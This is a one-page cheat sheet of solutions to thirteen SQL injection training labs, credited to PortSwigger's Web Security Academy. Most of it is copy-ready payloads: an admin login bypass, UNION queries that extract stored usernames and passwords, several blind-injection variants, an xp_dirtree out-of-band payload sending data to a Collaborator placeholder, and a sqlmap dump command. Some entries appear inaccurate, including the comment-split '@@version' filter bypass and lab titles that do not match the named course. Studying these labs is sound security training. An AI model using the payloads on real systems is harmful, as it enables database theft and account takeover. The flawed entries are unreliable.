# PortSwigger SQL Injection Labs — Complete Solutions

## Source: PortSwigger Web Security Academy

## Lab 1: SQL injection vulnerability in WHERE clause (retrieving hidden data)
**Goal:** Display unreleased products
**Solution:** `'+OR+1=1--` in category parameter
**Technique:** String injection with OR condition

## Lab 2: SQL injection vulnerability in WHERE clause (login bypass)
**Goal:** Login as admin without password
**Solution:** `administrator'--` in username field
**Technique:** Comment out password check

## Lab 3: SQL injection UNION attack (determine column count)
**Goal:** Find number of columns
**Solution:** `' UNION SELECT NULL,NULL,NULL--` increment NULLs until success
**Technique:** UNION-based column enumeration

## Lab 4: SQL injection UNION attack (find text field)
**Goal:** Find which column outputs text
**Solution:** `' UNION SELECT 'a','b','c'--` find which values appear
**Technique:** UNION with string literals

## Lab 5: SQL injection UNION attack (extract database)
**Goal:** Get database version and table names
**Solution:** `' UNION SELECT version(),database(),user()--`
**Technique:** UNION with DB functions

## Lab 6: SQL injection UNION attack (multiple tables)
**Goal:** Extract usernames and passwords
**Solution:** `' UNION SELECT username,password FROM users--`
**Technique:** UNION across tables

## Lab 7: Blind SQL injection with conditional responses
**Goal:** Extract admin password via true/false conditions
**Solution:** `TrackingId=xyz' AND '1'='1` vs `' AND '1'='2`
**Technique:** Boolean-based blind, infer character by character

## Lab 8: Blind SQL injection with conditional errors
**Goal:** Extract data via error messages
**Solution:** `' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')--`
**Technique:** Error-based blind

## Lab 9: Blind SQL injection with time delays
**Goal:** Extract data via time delays
**Solution:** `' OR SLEEP(10)--` (MySQL), `'; WAITFOR DELAY '0:0:10'--` (MSSQL)
**Technique:** Time-based blind SQLi

## Lab 10: Blind SQL injection with out-of-band (OAST)
**Goal:** Extract data via DNS lookup
**Solution:** `' exec master..xp_dirtree '//COLLABORATORURL/a'--`
**Technique:** Out-of-band SQLi via Burp Collaborator

## Lab 11: SQL injection with filter bypass
**Goal:** Bypass keyword filters
**Solution:** `' UNION SELECT @@version--` → `' UNION SELECT @@versio/**/n--`
**Technique:** Comment insertion to bypass filters

## Lab 12: Second-order SQL injection
**Goal:** SQLi in stored data that triggers when retrieved
**Solution:** Register with malicious name, then view profile where name is used in query
**Technique:** Store payload → trigger on read

## Lab 13: SQL injection through SOAP/XML
**Goal:** SQLi via XML parameter
**Solution:** `<storeId>1 UNION SELECT username,password FROM users</storeId>`
**Technique:** XML/SOAP to SQL injection

## Key Tools
- sqlmap: `sqlmap -u "URL" --cookie="..." --batch --dbs`
- Burp Intruder: For character-by-character blind brute force
- Burp Collaborator: For out-of-band exfiltration
